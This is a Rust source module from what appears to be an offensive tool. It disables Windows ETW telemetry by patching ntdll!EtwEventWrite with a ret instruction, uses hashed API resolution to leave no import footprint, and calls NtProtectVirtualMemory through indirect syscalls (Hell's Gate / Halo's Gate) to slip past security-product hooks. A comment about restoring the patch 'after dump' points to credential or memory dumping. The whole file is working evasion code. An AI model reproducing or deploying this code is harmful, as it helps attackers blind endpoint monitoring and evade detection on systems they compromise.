//! User-mode ETW bypass via ntdll!EtwEventWrite patching
//!
//! Patches the first byte of ntdll!EtwEventWrite with `ret` (0xC3) in our own
//! process to suppress ETW telemetry from user-mode API calls.
//!
//! Uses indirect syscalls (Hell's Gate / Halo's Gate) to invoke
//! NtProtectVirtualMemory — bypasses both kernel32 and ntdll hooks.
//! No static imports, no IAT footprint.

use crate::resolver::{self, ApiResolver};
use crate::syscall;

/// Saved state for restoring EtwEventWrite after dump
pub struct EtwState {
    pub etw_address: *mut u8,
    pub original_byte: u8,
    pub patched: bool,
}

const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// Patch ntdll!EtwEventWrite with `ret` (0xC3) in our own process
/// Uses indirect syscall for NtProtectVirtualMemory (no user-mode hooks)
pub fn disable_etw(api: &ApiResolver) -> Result<EtwState, String> {
    // 1. Resolve ntdll!EtwEventWrite via DJB2 hash
    let etw_hash = resolver::api_hash(b"EtwEventWrite");
    let etw_ptr = api
        .ntdll(etw_hash)
        .ok_or("EtwEventWrite not found in ntdll")?;
    let etw_addr = etw_ptr as *mut u8;
    println!("    EtwEventWrite: {:p}", etw_addr);

    // 2. Resolve NtProtectVirtualMemory SSN via Hell's Gate / Halo's Gate
    let nqvm_hash = resolver::api_hash(b"NtProtectVirtualMemory");
    let sc = syscall::resolve_ssn(api, nqvm_hash)
        .ok_or("Failed to resolve NtProtectVirtualMemory SSN")?;
    println!("    NtProtectVirtualMemory SSN: 0x{:04X}", sc.ssn);

    unsafe {
        // 3. Save original first byte
        let original_byte = *etw_addr;
        println!("    Original byte: 0x{:02X}", original_byte);

        // 4. Make page writable via indirect syscall
        //    NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, NewProtect, *OldProtect)
        let process_handle: isize = -1; // current process (NtCurrentProcess)
        let mut base_addr = etw_addr as *mut u8;
        let mut region_size: usize = 1;
        let mut old_protect: u32 = 0;

        let status = syscall::indirect_syscall5!(
            sc,
            process_handle,
            &mut base_addr as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            PAGE_EXECUTE_READWRITE as u64,
            &mut old_protect as *mut _ as u64
        );
        if status < 0 {
            return Err(format!(
                "NtProtectVirtualMemory(RWX) failed: 0x{:08X}",
                status as u32
            ));
        }

        // 5. Patch with `ret` (0xC3)
        *etw_addr = 0xC3;

        // 6. Restore original page protection via indirect syscall
        base_addr = etw_addr as *mut u8;
        region_size = 1;
        let mut tmp: u32 = 0;
        let _ = syscall::indirect_syscall5!(
            sc,
            process_handle,
            &mut base_addr as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            old_protect as u64,
            &mut tmp as *mut _ as u64
        );

        // 7. Verify
        if *etw_addr != 0xC3 {
            return Err(format!("ETW patch verify failed: 0x{:02X}", *etw_addr));
        }

        println!("    [+] EtwEventWrite patched → ret (0xC3)");

        Ok(EtwState {
            etw_address: etw_addr,
            original_byte,
            patched: true,
        })
    }
}

/// Restore original EtwEventWrite byte
pub fn restore_etw(state: &EtwState) -> Result<(), String> {
    if !state.patched || state.etw_address.is_null() {
        return Ok(());
    }

    // Re-resolve NtProtectVirtualMemory SSN via PEB walk
    let api = crate::resolver::ApiResolver::init()
        .map_err(|e| format!("ApiResolver init failed on restore: {}", e))?;
    let nqvm_hash = resolver::api_hash(b"NtProtectVirtualMemory");
    let sc = syscall::resolve_ssn(&api, nqvm_hash)
        .ok_or("Failed to resolve NtProtectVirtualMemory SSN on restore")?;

    unsafe {
        let process_handle: isize = -1;
        let mut base_addr = state.etw_address;
        let mut region_size: usize = 1;
        let mut old_protect: u32 = 0;

        let status = syscall::indirect_syscall5!(
            sc,
            process_handle,
            &mut base_addr as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            PAGE_EXECUTE_READWRITE as u64,
            &mut old_protect as *mut _ as u64
        );
        if status < 0 {
            return Err(format!(
                "NtProtectVirtualMemory(RWX) failed on restore: 0x{:08X}",
                status as u32
            ));
        }

        *state.etw_address = state.original_byte;

        base_addr = state.etw_address;
        region_size = 1;
        let mut tmp: u32 = 0;
        let _ = syscall::indirect_syscall5!(
            sc,
            process_handle,
            &mut base_addr as *mut _ as u64,
            &mut region_size as *mut _ as u64,
            old_protect as u64,
            &mut tmp as *mut _ as u64
        );

        if *state.etw_address != state.original_byte {
            return Err(format!(
                "ETW restore verify failed: expected 0x{:02X}, got 0x{:02X}",
                state.original_byte, *state.etw_address
            ));
        }
    }

    Ok(())
}
